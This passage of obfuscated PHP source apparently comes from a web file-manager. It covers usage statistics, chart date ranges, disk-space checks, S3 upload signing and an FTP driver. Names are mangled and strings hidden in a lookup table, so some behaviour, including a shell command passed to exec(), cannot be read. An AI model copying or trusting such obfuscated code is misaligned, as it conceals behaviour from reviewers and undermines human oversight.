$CæÀÆµËõ[$d»¾²ƒ¥Í¾[206]], $d»¾²ƒ¥Í¾[1325] => $f‚°ñ¡ãÁ); $aÄ„ÓÀò‚[$eÃÇù«×‡ƒ[$a–¨‹Ñ]] = isset($CæÀÆµËõ[$D·íÜËè¿¶]) ? $CæÀÆµËõ[$D·íÜËè¿¶] : 0; $B§Ò¦ƒÃ×‹[] = $aÄ„ÓÀò‚; } } goto a¶Ëë‹ÔÚ; a¶Ëë‹ÔÚ: return $B§Ò¦ƒÃ×‹; goto aƒòŸÜÍ»¹; Ağ®Ë¹Á•©: if ($c‰ÅŠ§¶Ù && $bæ›íÀ÷ != $d»¾²ƒ¥Í¾[1392]) { $A­ƒåÖŒÔ = $c‰ÅŠ§¶Ù[0][$d»¾²ƒ¥Í¾[206]]; $dºÒÂ‚ô‚» = $this->validDate($bæ›íÀ÷, $A­ƒåÖŒÔ); $F†¹ƒÁ÷à = array(); $c´êŸãôÍ = array_to_keyvalue($c‰ÅŠ§¶Ù, $d»¾²ƒ¥Í¾[206]); foreach ($dºÒÂ‚ô‚» as $bñ——Áˆó˜) { if (isset($c´êŸãôÍ[$bñ——Áˆó˜])) { $aÄ„ÓÀò‚ = $c´êŸãôÍ[$bñ——Áˆó˜]; } else { $aÄ„ÓÀò‚ = end($c‰ÅŠ§¶Ù); $aÄ„ÓÀò‚[$d»¾²ƒ¥Í¾[206]] = $bñ——Áˆó˜; if ($a–¨‹Ñ == $d»¾²ƒ¥Í¾[530]) { $aÄ„ÓÀò‚[$d»¾²ƒ¥Í¾[2007]] = $aÄ„ÓÀò‚[$d»¾²ƒ¥Í¾[2008]] = 0; } } $F†¹ƒÁ÷à[] = $aÄ„ÓÀò‚; } $c‰ÅŠ§¶Ù = $F†¹ƒÁ÷à; } $d ‡ó¾¨ÍÑ = array($d»¾²ƒ¥Í¾[530] => array($d»¾²ƒ¥Í¾[702] => LNG($d»¾²ƒ¥Í¾[2023]), $d»¾²ƒ¥Í¾[2007] => LNG($d»¾²ƒ¥Í¾[2024]), $d»¾²ƒ¥Í¾[2008] => LNG($d»¾²ƒ¥Í¾[2025])), $d»¾²ƒ¥Í¾[2009] => array($d»¾²ƒ¥Í¾[700] => LNG($d»¾²ƒ¥Í¾[2026]), $d»¾²ƒ¥Í¾[2011] => LNG($d»¾²ƒ¥Í¾[2027]), $d»¾²ƒ¥Í¾[2012] => LNG($d»¾²ƒ¥Í¾[2028]), $d»¾²ƒ¥Í¾[2013] => LNG($d»¾²ƒ¥Í¾[2029]))); $eÃÇù«×‡ƒ = array($d»¾²ƒ¥Í¾[530] => $d»¾²ƒ¥Í¾[2030], $d»¾²ƒ¥Í¾[2009] => $d»¾²ƒ¥Í¾[77]); goto B×Êğ³îíó; dó‰À‹ÍÕÉ: $d»¾²ƒ¥Í¾ =& $_SERVER[Õİõş]; if (!$this->init($a–¨‹Ñ)) { return !1; } $c‰ÅŠ§¶Ù = $this->trendList($a–¨‹Ñ); goto Ağ®Ë¹Á•©; aƒòŸÜÍ»¹: } public function validDate($bŒ¹‘‹”÷Ê, $bè„õĞéáŸ) { goto cÇĞ‹¬à¥Ì; Dˆ°Ç‚Ë›³: return $f¥Ÿ˜ÕÎ‚Ş; goto aˆ„àØ›‰š; cÇĞ‹¬à¥Ì: $c¼ëï”ÄÖÂ =& $_SERVER[Õİõş]; $A¨—¿µ¡Ë = date($c¼ëï”ÄÖÂ[2014], strtotime($c¼ëï”ÄÖÂ[2015])); $f¥Ÿ˜ÕÎ‚Ş = array($A¨—¿µ¡Ë); goto eòŒ†‹öõ•; eòŒ†‹öõ•: switch ($bŒ¹‘‹”÷Ê) { case $c¼ëï”ÄÖÂ[1399]: $dÜß¯¼¸…ğ = mktime(0, 0, 0, date($c¼ëï”ÄÖÂ[2031]), date($c¼ëï”ÄÖÂ[2032]) - date($c¼ëï”ÄÖÂ[1221]) + 7 - 7, date($c¼ëï”ÄÖÂ[2033])); $DÃ¡‡Ïéâô = 0; do { $f˜Ø®êæ¨£ = date($c¼ëï”ÄÖÂ[2014], $dÜß¯¼¸…ğ - 3600 * 24 * 7 * $DÃ¡‡Ïéâô); $f¥Ÿ˜ÕÎ‚Ş[] = $f˜Ø®êæ¨£; $DÃ¡‡Ïéâô++; } while ($bè„õĞéáŸ < $f˜Ø®êæ¨£); break; case $c¼ëï”ÄÖÂ[1397]: $DÃ¡‡Ïéâô = 1; do { $D¿¬×‡¦‰ = date($c¼ëï”ÄÖÂ[2034], strtotime("\x2d\x20{$DÃ¡‡Ïéâô}\40\x6d\157\x6e\x74\x68\163")); $f¥Ÿ˜ÕÎ‚Ş[] = $D¿¬×‡¦‰; $DÃ¡‡Ïéâô++; } while ($bè„õĞéáŸ < $D¿¬×‡¦‰); break; case $c¼ëï”ÄÖÂ[1702]: $EË–†‚“ = (int) date($c¼ëï”ÄÖÂ[2033], strtotime($bè„õĞéáŸ)); $b‰‚šºØ = (int) date($c¼ëï”ÄÖÂ[2033]); if ($EË–†‚“ >= $b‰‚šºØ) { break; } for ($EË–†‚“; $EË–†‚“ < $b‰‚šºØ; $EË–†‚“++) { $f¥Ÿ˜ÕÎ‚Ş[] = $EË–†‚“ . $c¼ëï”ÄÖÂ[2035]; } break; default: break; } if ($bè„õĞéáŸ > end($f¥Ÿ˜ÕÎ‚Ş)) { array_pop($f¥Ÿ˜ÕÎ‚Ş); } sort($f¥Ÿ˜ÕÎ‚Ş); goto Dˆ°Ç‚Ë›³; aˆ„àØ›‰š: } public function listTable($a•ÉÙÕ²¥‚) { $Då²½ª¿Ú™ = ucfirst($a•ÉÙÕ²¥‚); return Model($Då²½ª¿Ú™)->listData(); } public function option($Bµ¦æ³ƒ) { $E…ªÙ Æºô = $_SERVER[Õİõş][2036] . ucfirst($Bµ¦æ³ƒ); return $this->{$E…ªÙ Æºô}(); } private function optionUser() { goto C‰Š¯âÍŠ; C‰Š¯âÍŠ: $dŸÌéå‚ë =& $_SERVER[Õİõş]; $cåÌîˆŠÔà = Model($dŸÌéå‚ë[472])->count($dŸÌéå‚ë[1417]); $cÆÄ£Ó‰ÏÍ = Model($dŸÌéå‚ë[472])->where($dŸÌéå‚ë[2037])->count($dŸÌéå‚ë[1417]); goto cŸ‹ìêø; E¾§ß£œµ§: if (!$AïŞì¢¦”) { $AïŞì¢¦” = 1; } $f–ÜÙĞ„­® = strtotime(date($dŸÌéå‚ë[2018])); $EƒÊ‹÷ÑÔŒ = array($dŸÌéå‚ë[2039] => array($dŸÌéå‚ë[932], $f–ÜÙĞ„­®)); goto F³é†İ›‘; cŸ‹ìêø: $f–ÜÙĞ„­® = strtotime($dŸÌéå‚ë[2038]); $EƒÊ‹÷ÑÔŒ = array($dŸÌéå‚ë[2039] => array($dŸÌéå‚ë[932], $f–ÜÙĞ„­®)); $AïŞì¢¦” = (int) Model($dŸÌéå‚ë[472])->where($EƒÊ‹÷ÑÔŒ)->count($dŸÌéå‚ë[1417]); goto E¾§ß£œµ§; F³é†İ›‘: $b‡‘°¹¼ª” = Model($dŸÌéå‚ë[472])->where($EƒÊ‹÷ÑÔŒ)->count($dŸÌéå‚ë[1417]); return array($dŸÌéå‚ë[697] => (int) $cåÌîˆŠÔà, $dŸÌéå‚ë[2040] => (int) ($cåÌîˆŠÔà - $cÆÄ£Ó‰ÏÍ), $dŸÌéå‚ë[2041] => (int) $cÆÄ£Ó‰ÏÍ, $dŸÌéå‚ë[2042] => (int) $b‡‘°¹¼ª”, $dŸÌéå‚ë[2043] => $AïŞì¢¦”); goto bç„ÅÏÓÄ; bç„ÅÏÓÄ: } private function optionFile() { goto cøòé›¥¿; DàïÑâÃ¡ƒ: $aà¥×¸í‚ = $AÆÙ–ÄŠÁ[$Bê¨á‹×ÙÊ[2011]]; $BÖ†’Ó’Îª = Model($Bê¨á‹×ÙÊ[754])->where(array($Bê¨á‹×ÙÊ[366] => 0))->count($Bê¨á‹×ÙÊ[365]); $FõƒÔ²åæ· = array($Bê¨á‹×ÙÊ[366] => 0, $Bê¨á‹×ÙÊ[183] => array($Bê¨á‹×ÙÊ[932], strtotime(date($Bê¨á‹×ÙÊ[2018])))); goto E¿µŸƒÖ¿; E¿µŸƒÖ¿: $cµğ¨ÀÊ÷Ù = Model($Bê¨á‹×ÙÊ[754])->where($FõƒÔ²åæ·)->sum($Bê¨á‹×ÙÊ[77]); $fˆíÚ×‡Ûô = Model($Bê¨á‹×ÙÊ[754])->where($FõƒÔ²åæ·)->count($Bê¨á‹×ÙÊ[365]); return array($Bê¨á‹×ÙÊ[700] => $Dƒ”†ïŒˆÆ, $Bê¨á‹×ÙÊ[2011] => $aà¥×¸í‚, $Bê¨á‹×ÙÊ[2044] => $Dƒ”†ïŒˆÆ - $aà¥×¸í‚, $Bê¨á‹×ÙÊ[2045] => (int) $cµğ¨ÀÊ÷Ù, $Bê¨á‹×ÙÊ[702] => (int) $BÖ†’Ó’Îª, $Bê¨á‹×ÙÊ[2046] => (int) $fˆíÚ×‡Ûô); goto f“ñŠ¹…Ó…; cøòé›¥¿: $Bê¨á‹×ÙÊ =& $_SERVER[Õİõş]; $AÆÙ–ÄŠÁ = $this->sourceSize(); $Dƒ”†ïŒˆÆ = $AÆÙ–ÄŠÁ[$Bê¨á‹×ÙÊ[77]]; goto DàïÑâÃ¡ƒ; f“ñŠ¹…Ó…: } private function optionAccess() { $Eæ¬‚ã¹ =& $_SERVER[Õİõş]; return array($Eæ¬‚ã¹[697] => $this->typeLogCnt(), $Eæ¬‚ã¹[102] => $this->typeLogCnt($Eæ¬‚ã¹[102]), $Eæ¬‚ã¹[399] => $this->typeLogCnt($Eæ¬‚ã¹[399]), $Eæ¬‚ã¹[2047] => $this->typeLogCnt($Eæ¬‚ã¹[2047]), $Eæ¬‚ã¹[2048] => $this->typeLogCnt($Eæ¬‚ã¹[2048]), $Eæ¬‚ã¹[530] => $this->typeLogCnt($Eæ¬‚ã¹[33], $Eæ¬‚ã¹[2022])); } private function typeLogCnt($fùßå¾©¢¦ = '', $aÙ×Ôºä° = "\x69\x64") { goto b´¥¤µŞÂö; bÙ¢—éå: $F¼İõñ“Óù = array($dĞçùÖÊİÀ[183] => array($dĞçùÖÊİÀ[932], $fÈ”åô£ñ)); if ($fùßå¾©¢¦) { $F¼İõñ“Óù[$dĞçùÖÊİÀ[29]] = array($dĞçùÖÊİÀ[7], $f„×ì éñ”[$fùßå¾©¢¦]); } $añŒÃî„–Ü = Model($dĞçùÖÊİÀ[2021])->where($F¼İõñ“Óù)->count($aÙ×Ôºä°); goto e—³‰š°¨; b´¥¤µŞÂö: $dĞçùÖÊİÀ =& $_SERVER[Õİõş]; $f„×ì éñ” = array($dĞçùÖÊİÀ[102] => array($dĞçùÖÊİÀ[2049], $dĞçùÖÊİÀ[2050]), $dĞçùÖÊİÀ[399] => array($dĞçùÖÊİÀ[2051], $dĞçùÖÊİÀ[2052]), $dĞçùÖÊİÀ[2047] => array($dĞçùÖÊİÀ[2053], $dĞçùÖÊİÀ[2054]), $dĞçùÖÊİÀ[2048] => array($dĞçùÖÊİÀ[2055], $dĞçùÖÊİÀ[2056]), $dĞçùÖÊİÀ[2057] => array($dĞçùÖÊİÀ[2058], $dĞçùÖÊİÀ[2059], $dĞçùÖÊİÀ[2060])); $fÈ”åô£ñ = strtotime(date($dĞçùÖÊİÀ[2018])); goto bÙ¢—éå; e—³‰š°¨: return (int) $añŒÃî„–Ü; goto dëÒÂïàãÎ; dëÒÂïàãÎ: } private function optionServer() { goto bš ßØ–èù; bš ßØ–èù: $dŞá‹„Î× =& $_SERVER[Õİõş]; $EŠÄçëšœ = $this->diskDriver(); $CÇôª­Íš = KodIO::defaultDriver(); goto EÃ‡À¯Î²¯; EÃ‡À¯Î²¯: $Fßí÷­µ = array($dŞá‹„Î×[745] => $CÇôª­Íš[$dŞá‹„Î×[363]]); $F©Ê’â×¨ = Model($dŞá‹„Î×[417])->where($Fßí÷­µ)->sum($dŞá‹„Î×[77]); $aì»ÛÈ‚öº = explode($dŞá‹„Î×[50], $_SERVER[$dŞá‹„Î×[137]]); goto e÷Ğ«Ù…¶; a‹«‡èË¢: return array($dŞá‹„Î×[2063] => $EŠÄçëšœ ? $EŠÄçëšœ[$dŞá‹„Î×[2064]] : 0, $dŞá‹„Î×[2065] => $EŠÄçëšœ ? $EŠÄçëšœ[$dŞá‹„Î×[2066]] : 0, $dŞá‹„Î×[2067] => (int) $CÇôª­Íš[$dŞá‹„Î×[2064]] * 1024 * 1024 * 1024, $dŞá‹„Î×[2068] => (int) $F©Ê’â×¨, $dŞá‹„Î×[2069] => ucfirst($F–«éñŞ˜), $dŞá‹„Î×[2070] => $dŞá‹„Î×[2071] . PHP_VERSION, $dŞá‹„Î×[2072] => phpBuild64() ? 64 : 32, $dŞá‹„Î×[696] => str_replace($dŞá‹„Î×[2073], $dŞá‹„Î×[908], $CÜÓ¨åª‰™), $dŞá‹„Î×[333] => ucfirst($AÕÅ†Ğ³£È), $dŞá‹„Î×[28] => $_SERVER[$dŞá‹„Î×[2074]]); goto F¿¶Ş›¥Ï¼; e÷Ğ«Ù…¶: $F–«éñŞ˜ = $aì»ÛÈ‚öº[0]; $A£¸Ò£‚Ó = $GLOBALS[$dŞá‹„Î×[6]][$dŞá‹„Î×[17]]; $CÜÓ¨åª‰™ = $A£¸Ò£‚Ó[$dŞá‹„Î×[892]]; goto fÍ™£Õˆ ; fÍ™£Õˆ : if ($CÜÓ¨åª‰™ == $dŞá‹„Î×[726]) { $càßÌºí– = explode($dŞá‹„Î×[1079], $A£¸Ò£‚Ó[$dŞá‹„Î×[891]]); $CÜÓ¨åª‰™ = $càßÌºí–[0]; } if ($CÜÓ¨åª‰™ == $dŞá‹„Î×[729] || $CÜÓ¨åª‰™ == $dŞá‹„Î×[730]) { $F¤ƒÆ¡èêá = Model()->db()->query($dŞá‹„Î×[2061]); $eëÒÅÓÍö‰ = $F¤ƒÆ¡èêá[0] && isset($F¤ƒÆ¡èêá[0][$dŞá‹„Î×[1324]]) ? $F¤ƒÆ¡èêá[0][$dŞá‹„Î×[1324]] : 0; $CÜÓ¨åª‰™ = $dŞá‹„Î×[2062] . ($eëÒÅÓÍö‰ ? $dŞá‹„Î×[8] . $eëÒÅÓÍö‰ : $dŞá‹„Î×[33]); } $AÕÅ†Ğ³£È = $GLOBALS[$dŞá‹„Î×[6]][$dŞá‹„Î×[333]][$dŞá‹„Î×[755]]; goto a‹«‡èË¢; F¿¶Ş›¥Ï¼: } private function diskDriver() { goto Bß£³ÆÏÒ»; Bß£³ÆÏÒ»: $DïğÈ¢Æ =& $_SERVER[Õİõş]; $A‰–ŸšÌç¯ = $DïğÈ¢Æ[8]; $D¨Œ¹ˆÚ = $GLOBALS[$DïğÈ¢Æ[6]][$DïğÈ¢Æ[2075]] == $DïğÈ¢Æ[2076]; goto CÛñ´µÄ–‘; CÛñ´µÄ–‘: if ($D¨Œ¹ˆÚ) { $A‰–ŸšÌç¯ = $DïğÈ¢Æ[2077]; if (function_exists($DïğÈ¢Æ[2078])) { exec($DïğÈ¢Æ[2079], $eğ›ÌĞĞ…„); $A‰–ŸšÌç¯ = $eğ›ÌĞĞ…„[1] . $DïğÈ¢Æ[8]; } } if (!file_exists($A‰–ŸšÌç¯)) { return; } $fÈ††²õÂÙ = @disk_total_space($A‰–ŸšÌç¯); goto cÇÑµ…´Æ; cÇÑµ…´Æ: $bôÈ‚šæàƒ = $fÈ††²õÂÙ - @disk_free_space($A‰–ŸšÌç¯); return array($DïğÈ¢Æ[2064] => $fÈ††²õÂÙ, $DïğÈ¢Æ[2066] => $bôÈ‚šæàƒ); goto E¨İæŒ§ùø; E¨İæŒ§ùø: } public function fileChart($e“ˆùÃ–ç¿) { goto EÍº¹ˆï°Õ; D÷»ê©Ÿ ƒ: $b¸Œ¾‘ÍÂä = $this->sourceSize(); $Eê‡†‘‚ï² = array($A»ø¿ÀÖù°[456] => 0, $A»ø¿ÀÖù°[367] => 1); $bÍÏîêÇ—º = Model($A»ø¿ÀÖù°[754])->where($Eê‡†‘‚ï²)->sum($A»ø¿ÀÖù°[77]); goto AÑ›èÎæ‡í; EÍº¹ˆï°Õ: $A»ø¿ÀÖù° =& $_SERVER[Õİõş]; if (isset($e“ˆùÃ–ç¿[$A»ø¿ÀÖù°[1417]])) { return Model($A»ø¿ÀÖù°[754])->userFileTypeProfile($e“ˆùÃ–ç¿[$A»ø¿ÀÖù°[1417]]); } if (isset($e“ˆùÃ–ç¿[$A»ø¿ÀÖù°[2080]])) { return Model($A»ø¿ÀÖù°[754])->groupFileTypeProfile($e“ˆùÃ–ç¿[$A»ø¿ÀÖù°[2080]]); } goto D÷»ê©Ÿ ƒ; AÑ›èÎæ‡í: $Eê‡†‘‚ï²[$A»ø¿ÀÖù°[367]] = 2; $F™Éì÷â¤ = Model($A»ø¿ÀÖù°[754])->where($Eê‡†‘‚ï²)->sum($A»ø¿ÀÖù°[77]); return array($A»ø¿ÀÖù°[700] => $b¸Œ¾‘ÍÂä[$A»ø¿ÀÖù°[77]], $A»ø¿ÀÖù°[2011] => $b¸Œ¾‘ÍÂä[$A»ø¿ÀÖù°[2011]], $A»ø¿ÀÖù°[2012] => (int) $bÍÏîêÇ—º, $A»ø¿ÀÖù°[2013] => (int) $F™Éì÷â¤); goto D„ğ–İªÕ¹; D„ğ–İªÕ¹: } private function sourceSize() { $A¾‚‰°Úğ¡ =& $_SERVER[Õİõş]; $cÅÓØŒ¯ = Model($A¾‚‰°Úğ¡[754])->where(array($A¾‚‰°Úğ¡[366] => 0))->sum($A¾‚‰°Úğ¡[77]); $c¶®ï™˜ºƒ = Model($A¾‚‰°Úğ¡[417])->sum($A¾‚‰°Úğ¡[77]); if ($c¶®ï™˜ºƒ > $cÅÓØŒ¯) { $c¶®ï™˜ºƒ = $cÅÓØŒ¯; } return array($A¾‚‰°Úğ¡[77] => (int) $cÅÓØŒ¯, $A¾‚‰°Úğ¡[2011] => (int) $c¶®ï™˜ºƒ); } } goto CÆ³îõ¦; dßÆğ¸°‰á: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($aˆøÌŒ…Õ°) { $this->pathParse = $aˆøÌŒ…Õ°; } protected function infoParse($dãºË‹·»Ô) { $DÛÀ¿ƒ˜É =& $_SERVER[Õİõş]; return Action($DÛÀ¿ƒ˜É[1019])->sharePathInfo($this->pathParse[$DÛÀ¿ƒ˜É[75]], !0); } public function listPath($cÍÛõ„÷­, $e‘îÅšª«é = false) { $AËïÔí±‘ =& $_SERVER[Õİõş]; $c”Ş¼ƒŠç = IO::listPath($cÍÛõ„÷­, $e‘îÅšª«é); foreach ($c”Ş¼ƒŠç as $C‚—¦ÃõŠ± => $eÒ†ëÓÔ‘Œ) { if (!in_array($C‚—¦ÃõŠ±, array($AËïÔí±‘[73], $AËïÔí±‘[74]))) { continue; } foreach ($eÒ†ëÓÔ‘Œ as $F¯‡ÖªƒÀó => $Aæ°¦ÎùÆ) { $Aæ°¦ÎùÆ = Action($AËïÔí±‘[1128])->parsePathChildren($Aæ°¦ÎùÆ, array($AËïÔí±‘[383] => $cÍÛõ„÷­)); $c”Ş¼ƒŠç[$C‚—¦ÃõŠ±][$F¯‡ÖªƒÀó] = Action($AËïÔí±‘[1019])->shareItemInfo($Aæ°¦ÎùÆ); } } return $c”Ş¼ƒŠç; } public function listAll($E¿ïÍ¯ Éì) { $b•çïãåˆ¦ =& $_SERVER[Õİõş]; $fğÕ‹£éÅ = IO::listAll($E¿ïÍ¯ Éì); foreach ($fğÕ‹£éÅ as &$D†ö÷ÄÏª) { $D†ö÷ÄÏª = array_merge(IO::info($D†ö÷ÄÏª[$b•çïãåˆ¦[75]]), $D†ö÷ÄÏª); $D†ö÷ÄÏª[$b•çïãåˆ¦[387]] = Action($b•çïãåˆ¦[1019])->shareItemInfo($D†ö÷ÄÏª); } return $fğÕ‹£éÅ; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($CˆÍÍ–ù“¬) { parent::__construct($CˆÍÍ–ù“¬); $this->signatureVersion($_SERVER[Õİõş][196]); } public function uploadFormData($E™•Š¢Ö¢°, $aÎùÓÌ• = 3600) { goto DÀÁùƒ§å™; dÌñÎ´ÑÊ: $dª¾šù²å = base64_encode(json_encode($B’×˜”ÜÍ¸)); $CÄÚíÜçª» = hash_hmac($Dª…ö¢ÄĞï[1139], $A‡Âï§ß‚¾, $Dª…ö¢ÄĞï[1140] . $this->secret, !0); $EÏ–¨ã¡˜‡ = hash_hmac($Dª…ö¢ÄĞï[1139], $this->region, $CÄÚíÜçª», !0); goto dä£Ó¤í©ğ; DÀÁùƒ§å™: $Dª…ö¢ÄĞï =& $_SERVER[Õİõş]; $fµ¾öÀğù = $Dª…ö¢ÄĞï[181]; $cĞÛ ø¹É = $Dª…ö¢ÄĞï[1129]; goto Aº˜Ô±ë‰÷; ašÚ²ïâ¸§: $AãÉ­ˆù¶ò = array($Dª…ö¢ÄĞï[195] => $Dª…ö¢ÄĞï[33], $Dª…ö¢ÄĞï[1141] => $Dª…ö¢ÄĞï[33], $Dª…ö¢ÄĞï[1100] => $fµ¾öÀğù, $Dª…ö¢ÄĞï[1104] => $e•˜ÓÆğÅŠ, $Dª…ö¢ÄĞï[1108] => $dª¾šù²å, $Dª…ö¢ÄĞï[1142] => $e¹‹‹¿Ñ÷ô, $Dª…ö¢ÄĞï[1143] => $cĞÛ ø¹É, $Dª…ö¢ÄĞï[1144] => $e‡ˆ’ö÷Ê, $Dª…ö¢ÄĞï[1145] => $EÎÜ¬í¡ê, $Dª…ö¢ÄĞï[1146] => $E¿ÌÚŞ„ˆ, $Dª…ö¢ÄĞï[165] => $this->getHost()); return $AãÉ­ˆù¶ò; goto bÀÕ§Ê¢°’; côÅ¡°ÌµÍ: $AÊ£¢Üæê = array($this->accessKey, $A‡Âï§ß‚¾, $this->region, $c‚õšóÆÁ, $BÅÎÌ‡¥ƒ); $e¹‹‹¿Ñ÷ô = implode($Dª…ö¢ÄĞï[8], $AÊ£¢Üæê); $B’×˜”ÜÍ¸ = array($Dª…ö¢ÄĞï[1098] => gmdate($Dª…ö¢ÄĞï[1097], strtotime($Dª…ö¢ÄĞï[1132])), $Dª…ö¢ÄĞï[1099] => array(array($Dª…ö¢ÄĞï[1101] => $this->bucket), array($Dª…ö¢ÄĞï[1100] => $fµ¾öÀğù), array($Dª…ö¢ÄĞï[1102], $Dª…ö¢ÄĞï[1103], $Dª…ö¢ÄĞï[33]), array($Dª…ö¢ÄĞï[1102], $Dª…ö¢ÄĞï[1133], $Dª…ö¢ÄĞï[33]), array($Dª…ö¢ÄĞï[1102], $Dª…ö¢ÄĞï[1134], $Dª…ö¢ÄĞï[33]), array($Dª…ö¢ÄĞï[1104] => $e•˜ÓÆğÅŠ), array($Dª…ö¢ÄĞï[1135] => $e¹‹‹¿Ñ÷ô), array($Dª…ö¢ÄĞï[1136] => $cĞÛ ø¹É), array($Dª…ö¢ÄĞï[1137] => $e‡ˆ’ö÷Ê), array($Dª…ö¢ÄĞï[1138] => $EÎÜ¬í¡ê))); goto dÌñÎ´ÑÊ; dä£Ó¤í©ğ: $C¦íøˆ›ãâ = hash_hmac($Dª…ö¢ÄĞï[1139], $c‚õšóÆÁ, $EÏ–¨ã¡˜‡, !0); $aÍƒõ†Šà = hash_hmac($Dª…ö¢ÄĞï[1139], $BÅÎÌ‡¥ƒ, $C¦íøˆ›ãâ, !0); $E¿ÌÚŞ„ˆ = hash_hmac($Dª…ö¢ÄĞï[1139], $dª¾šù²å, $aÍƒõ†Šà); goto ašÚ²ïâ¸§; Aº˜Ô±ë‰÷: $c‚õšóÆÁ = $Dª…ö¢ÄĞï[59]; $e‡ˆ’ö÷Ê = gmdate($Dª…ö¢ÄĞï[1130]); $A‡Âï§ß‚¾ = gmdate($Dª…ö¢ÄĞï[692]); goto a²ó®­Î©Î; a²ó®­Î©Î: $BÅÎÌ‡¥ƒ = $Dª…ö¢ÄĞï[1131]; $EÎÜ¬í¡ê = $aÎùÓÌ• . $Dª…ö¢ÄĞï[33]; $e•˜ÓÆğÅŠ = $Dª…ö¢ÄĞï[1096]; goto côÅ¡°ÌµÍ; bÀÕ§Ê¢°’: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = FALSE; public function __construct($AÈ‚ĞÇ¥èÒ) { parent::__construct(); if (count($AÈ‚ĞÇ¥èÒ) > 0) { $this->_init($AÈ‚ĞÇ¥èÒ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($CÊ°ø¹ÉÚ­) { $B³‘àÄ‰õ® =& $_SERVER[Õİõş]; global $config; $this->appCharset = $config[$B³‘àÄ‰õ®[1147]]; $this->systemCharset = $config[$B³‘àÄ‰õ®[1148]]; if (isset($CÊ°ø¹ÉÚ­[$B³‘àÄ‰õ®[1149]]) && $CÊ°ø¹ÉÚ­[$B³‘àÄ‰õ®[1149]]) { $this->systemCharset = $CÊ°ø¹ÉÚ­[$B³‘àÄ‰õ®[1149]]; } } public function iconvApp($bÏ’éÓ¨İ) { return $this->iconvTo($bÏ’éÓ¨İ, $this->systemCharset, $this->appCharset); } public function iconvSystem($aÌ«ïŒĞç) { return $this->iconvTo($aÌ«ïŒĞç, $this->appCharset, $this->systemCharset); } public function getPathOuter($a æé›Ëš) { goto Cª»†òØ¹; Cª»†òØ¹: $eìíî—ÜÛƒ =& $_SERVER[Õİõş]; $Fµè˜²ƒ…› = $this->iconvApp($this->pathBase); $a æé›Ëš = $this->iconvApp($a æé›Ëš); goto B–ïªï®Å; d„¢Ù¨¡‰…: return $this->pathDriver . $eìíî—ÜÛƒ[8] . ltrim($a æé›Ëš, $eìíî—ÜÛƒ[8]); goto E‚’’ì¼Èá; B–ïªï®Å: if (substr($Fµè˜²ƒ…›, 0, 2) == $eìíî—ÜÛƒ[1150]) { $Fµè˜²ƒ…› = BASIC_PATH . substr($Fµè˜²ƒ…›, 2); } if (substr($a æé›Ëš, 0, 2) == $eìíî—ÜÛƒ[1150]) { $a æé›Ëš = BASIC_PATH . substr($a æé›Ëš, 2); } $Fµè˜²ƒ…› = KodIO::clear($Fµè˜²ƒ…›); goto D„¿˜Ó“; D„¿˜Ó“: $a æé›Ëš = KodIO::clear($a æé›Ëš); $a æé›Ëš = substr($a æé›Ëš, strlen($Fµè˜²ƒ…›)); if (empty($this->pathDriver)) { return $a æé›Ëš; } goto d„¢Ù¨¡‰…; E‚’’ì¼Èá: } private function _init($bõŠÕÚé—¾ = array()) { goto FŠ¯­ïãŸ; B›ÓÖÔ¶Æ: $f­§Ó–Úö = isset($FçŞì‘Ö×[$f§¢‰¬ÀøÏ[164]]) && $FçŞì‘Ö×[$f§¢‰¬ÀøÏ[164]] == $f§¢‰¬ÀøÏ[1153] ? !0 : !1; $this->scheme = $f­§Ó–Úö ? $f§¢‰¬ÀøÏ[1154] : $f§¢‰¬ÀøÏ[1155]; $this->port = isset($FçŞì‘Ö×[$f§¢‰¬ÀøÏ[166]]) ? $FçŞì‘Ö×[$f§¢‰¬ÀøÏ[166]] : 21; goto bªˆô´èù; bªˆô´èù: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return; } $b‚ÇÆÀƒ¦¬ = @ftp_login($this->connect, $this->username, $this->userpass); goto B„‹ä²Ö¾; bŸíƒ¦Åë: foreach ($bõŠÕÚé—¾ as $A´ÀĞÙš±š => $C³Ò‚¾ˆ´æ) { if (isset($this->{$A´ÀĞÙš±š})) { $this->{$A´ÀĞÙš±š} = $C³Ò‚¾ˆ´æ; } } static $d“íÂà¸§ø = array(); $A‡ø’‘‰‹ = md5(json_encode($bõŠÕÚé—¾)); goto F‚„İ¬å±ò; F’ÀìëÊÛÓ: return $b‚ÇÆÀƒ¦¬; goto c‘ïÍ£§ƒã; F‚„İ¬å±ò: if (isset($d“íÂà¸§ø[$A‡ø’‘‰‹])) { foreach ($d“íÂà¸§ø[$A‡ø’‘‰‹] as $A´ÀĞÙš±š => $C³Ò‚¾ˆ´æ) { $this->{$A´ÀĞÙš±š} = $C³Ò‚¾ˆ´æ; } return !0; } $FçŞì‘Ö× = parse_url(trim($this->server, $f§¢‰¬ÀøÏ[8])); $this->host = $FçŞì‘Ö×[$f§¢‰¬ÀøÏ[165]]; goto B›ÓÖÔ¶Æ; B„‹ä²Ö¾: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); @ftp_pasv($this->connect, !0); $d“íÂà¸§ø[$A‡ø’‘‰‹] = array($f§¢‰¬ÀøÏ[1156] => $this->connect, $f§¢‰¬ÀøÏ[165] => $this->host, $f§¢‰¬ÀøÏ[164] => $this->scheme, $f§¢‰¬ÀøÏ[166] => $this->port); goto F’ÀìëÊÛÓ; FŠ¯­ïãŸ: $f§¢‰¬ÀøÏ =& $_SERVER[Õİõş]; if (!function_exists($f§¢‰¬ÀøÏ[1151])) { show_json(LNG($f§¢‰¬ÀøÏ[1152]), !1); } $this->charsetReset($bõŠÕÚé—¾); goto bŸíƒ¦Åë; c‘ïÍ£§ƒã: } private function _isconn() { return is_resource($this->connect); } public function mkfile($F‰ÜĞÑ’²ƒ, $Fï¿–¨™Ş = '', $D¹¤°‹¢¹© = REPEAT_RENAME) { if ($this->setContent($F‰ÜĞÑ’²ƒ, $Fï¿–¨™Ş)) { return $this->getPathOuter($F‰ÜĞÑ’²ƒ); } return !1; } public function mkdir($BÎœ·™’­, $c†…¡ÓÒœ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $BÎœ·™’­ = $this->iconvSystem($BÎœ·™’­); if ($this->isFolder($BÎœ·™’­) || @ftp_mkdir($this->connect, 